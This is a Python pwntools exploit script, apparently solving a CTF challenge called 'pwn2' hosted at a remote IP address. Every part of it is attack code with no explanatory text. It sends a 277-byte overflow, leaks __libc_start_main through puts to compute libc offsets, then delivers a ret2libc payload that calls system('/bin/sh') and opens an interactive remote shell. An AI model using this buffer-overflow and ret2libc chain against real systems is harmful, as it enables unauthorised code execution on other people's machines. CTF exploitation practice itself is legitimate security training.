from pwn import *
from LibcSearcher import *

elf = ELF('./pwn2')
#p = process('./pwn2')
p = remote('123.59.138.180',20000)
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

libc_start_main_got = elf.got['__libc_start_main']
print hex(libc_start_main_got)
print hex(puts_got)

print p.recvuntil("First, you need to tell me you name?")
p.sendline("A"*255)

#print p.recvuntil("What's you occupation?")
#p.sendline("B"*255)

print p.recvuntil("[Y/N]")

p.sendline('Y')



main = 0x08048637

#payload = "C"*277 + p32(puts_plt) + p32(main) + p32(puts_got)
payload = "C"*277 + p32(puts_plt) + p32(main) + p32(libc_start_main_got)
pause()
p.sendline(payload)

#libc_start_main_addr = u32(p.recvuntil('Welcome')[-12:-8])
#log.info("leak addr is " + hex(libc_start_main_addr))
p.recvuntil("\n\n")
libc_start_main_addr  = u32(p.recv(4))
print hex(libc_start_main_addr)
pause()
libc_base = libc_start_main_addr - 0x018540
system_addr = libc_base + 0x03a940
binsh_addr = libc_base + 0x15902b
log.info("libc_base addr " + hex(libc_base))
log.info("system_addr addr " + hex(system_addr))
log.info("binsh_addr addr " + hex(binsh_addr))


print p.recvuntil("First, you need to tell me you name?")
p.sendline("A"*255)

print p.recvuntil("[Y/N]")
p.sendline('Y')

payload_getshell = "C"*277 + p32(system_addr) + p32(0) + p32(binsh_addr)
p.sendline(payload_getshell)

'''
#payload = "C"*277 + p32(puts_plt) + p32(main) + p32(puts_got) + "ABCD"
payload = "C"*277 + p32(puts_plt) + p32(main) + p32(libc_start_main_got)
pause()
p.sendline(payload)


libc_start_main_addr = u32(p.recvuntil('Welcome')[-12:-8])

print hex(libc_start_main_addr)


libc_start_main_addr = p.recv()[0:4]
print hex(libc_start_main_addr)

libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
print libc
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
'''
p.interactive()



#EIP+0 found at offset: 277
#EBP+0 found at offset: 273
